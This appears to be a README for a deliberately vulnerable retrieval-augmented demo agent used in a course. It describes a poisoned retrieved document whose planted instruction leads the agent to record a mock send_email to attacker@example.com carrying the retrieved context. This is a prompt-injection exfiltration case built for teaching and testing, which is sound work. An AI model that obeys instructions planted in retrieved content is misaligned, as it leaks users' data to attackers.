# Vulnerable RAG Demo Target

This directory contains a minimal intentionally vulnerable demo target for the course MVP.

## Behavior

- `search_docs(query, use_poisoned_doc=False)` returns a fixed local document.
- `send_email(to, body)` is mock-only and records a simulated tool call.
- `read_secret()` returns the fake constant `DEMO_SECRET_DO_NOT_USE`.
- `run_target(prompt, use_poisoned_doc=False)` returns deterministic output with:
  - `response`
  - `tool_trace`
  - `retrieved_context`

## Intentional Vulnerability

When `use_poisoned_doc=True`, the retrieved document contains a malicious instruction with
`attacker@example.com`. The target trusts the retrieved context and records a mock
`send_email("attacker@example.com", retrieved_context)` tool call.

## Safety Constraints

- No real emails are sent.
- No real secrets are read.
- The target does not access environment variables.
- The target does not depend on the CLI, grader, or attack scenario loader.
